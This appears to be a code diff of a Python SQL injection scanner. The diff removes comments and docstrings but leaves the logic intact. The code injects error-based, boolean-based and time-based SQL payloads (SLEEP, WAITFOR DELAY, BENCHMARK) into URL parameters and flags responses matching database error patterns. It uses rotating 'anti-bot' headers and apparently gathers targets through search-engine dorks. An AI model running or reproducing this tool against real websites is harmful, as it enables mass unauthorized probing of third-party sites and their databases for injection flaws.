@@ -14,7 +14,6 @@ from urllib3.util.ssl_ import create_urllib3_context
 from urllib3.util.retry import Retry
 import warnings
 
-# Remove insecure warning suppression (we keep verification ON now)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
@@ -27,9 +26,8 @@ MAX_SEARCH_RESULTS = 100
 REQUEST_TIMEOUT = (10, 20)
 DELAY_BETWEEN_REQUESTS = (1, 3)
 CONSECUTIVE_TIMEOUT_THRESHOLD = 2
-MAX_API_PAGES = 10  # Google allows maximum 100 results (10 pages)
+MAX_API_PAGES = 10
 
-# Enhanced SQL error patterns
 SQL_ERROR_PATTERNS = [
     r"SQL syntax.*MySQL",
     r"Warning.*mysql_.*",
@@ -41,7 +39,6 @@ SQL_ERROR_PATTERNS = [
     r"DB2 SQL error"
 ]
 
-# Setup logging - only log to file, not console
 logging.basicConfig(
     level=logging.WARNING,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -50,12 +47,10 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
-logger.propagate = False  # Prevent logging to console
+logger.propagate = False
 
 
-# ✅ Hardened SSL Adapter
 class CustomSSLAdapter(requests.adapters.HTTPAdapter):
-    """HTTPAdapter with hardened SSLContext (TLS 1.2+) and retries."""
 
     def __init__(self, *args, **kwargs):
         self.ssl_context = create_urllib3_context()
@@ -107,7 +102,6 @@ class SqlScan:
         self.quiet_mode = False
 
     def _configure_session(self):
-        """Configure requests session with retries and strong TLS."""
         session = requests.Session()
         retry_strategy = Retry(
             total=3,
@@ -179,7 +173,7 @@ class SqlScan:
                 headers=self.get_random_headers(),
                 timeout=REQUEST_TIMEOUT,
                 allow_redirects=False,
-                verify=True  # Secure verification ON
+                verify=True
             )
             return response.text
         except Exception:
@@ -203,28 +197,22 @@ class SqlScan:
             return None
 
     def _test_payloads(self, url: str, parsed, query) -> bool:
-        """Test all payloads against the URL"""
         for param, values in query.items():
             for value in values:
                 for payload in self.payloads:
                     try:
-                        # Build test URL
                         test_url = self._build_test_url(parsed, param, value, payload)
                         
-                        # Make request with anti-bot headers
                         response = self._make_request(test_url)
                         if response is None:
                             continue
                             
-                        # Check for SQL errors
                         if self._detect_sql_errors(response):
                             return True
                             
-                        # Check for boolean-based differences
                         if self._check_boolean_based(url, param):
                             return True
                             
-                        # Check for time-based delays
                         if self._check_time_based(url, param):
                             return True
                             
@@ -234,14 +222,12 @@ class SqlScan:
         return False
 
     def _build_test_url(self, parsed, param, value, payload) -> str:
-        """Build URL with injected payload"""
         query = parse_qs(parsed.query)
         query[param] = [value + payload]
         new_query = urlencode(query, doseq=True)
         return urlunparse(parsed._replace(query=new_query))
 
     def _detect_sql_errors(self, response_text: str) -> bool:
-        """Check for SQL errors using regex patterns"""
         if not response_text:
             return False
             
@@ -249,7 +235,6 @@ class SqlScan:
         return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)
 
     def _check_boolean_based(self, url: str, param: str) -> bool:
-        """Check for boolean-based SQLi"""
         true_payloads = [
             f"{param}=1' AND '1'='1",
             f"{param}=1' OR '1'='1",
@@ -278,18 +263,14 @@ class SqlScan:
                 if not false_response:
                     continue
                     
-                # Significant difference means likely vulnerable
                 if self._calculate_difference(base_response, true_response, false_response):
                     return True
         return False
 
     def _calculate_difference(self, base: str, true_resp: str, false_resp: str) -> bool:
-        """Calculate response differences"""
-        # Simple length difference check
         if abs(len(true_resp) - len(false_resp)) > 100:
             return True
             
-        # Content comparison
         from difflib import SequenceMatcher
         true_diff = SequenceMatcher(None, base, true_resp).ratio()
         false_diff = SequenceMatcher(None, base, false_resp).ratio()
@@ -297,14 +278,13 @@ class SqlScan:
         return abs(true_diff - false_diff) > 0.3
 
     def _check_time_based(self, url: str, param: str) -> bool:
-        """Check for time delays"""
         payloads = [
             f"{param}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))--",
             f"{param}=1' WAITFOR DELAY '0:0:5'--",
             f"{param}=1 AND BENCHMARK(5000000,MD5(NOW()))"
         ]
         
-        threshold = 4  # seconds
+        threshold = 4
         
         for payload in payloads:
             start_time = time.time()
@@ -317,7 +297,6 @@ class SqlScan:
         return False
 
     def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
-        """Main scanning method with clean output"""
         vulnerable_urls = []
         page = 1
     
